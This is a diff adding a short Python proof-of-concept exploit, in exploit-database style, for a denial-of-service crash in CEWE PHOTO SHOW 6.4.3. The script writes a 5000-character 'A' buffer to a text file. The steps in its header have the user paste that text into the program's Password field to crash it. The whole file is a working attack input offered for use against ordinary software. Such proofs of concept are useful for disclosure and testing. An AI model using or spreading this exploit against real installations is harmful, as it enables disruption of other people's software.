@@ -1,0 +1,21 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: CEWE PHOTO SHOW 6.4.3 - Denial of Service (PoC)
+# Date: 16/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://cewe-photoworld.com/
+# Software: https://cewe-photoworld.com/creator-software/windows-download
+# Version: 6.4.3
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script 'photoshow.py', it will create a new file 'photoshow.txt'
+# 2.- Copy the text from the generated photoshow.txt file to clipboard
+# 3.- Open CEWE PHOTO SHOW
+# 4.- Click 'Upload'
+# 5.- Paste clipboard in the field 'Password' and crashed
+
+buffer = "\x41" * 5000
+
+f = open ("photoshow.txt", "w")
+f.write(buffer)
+f.close()
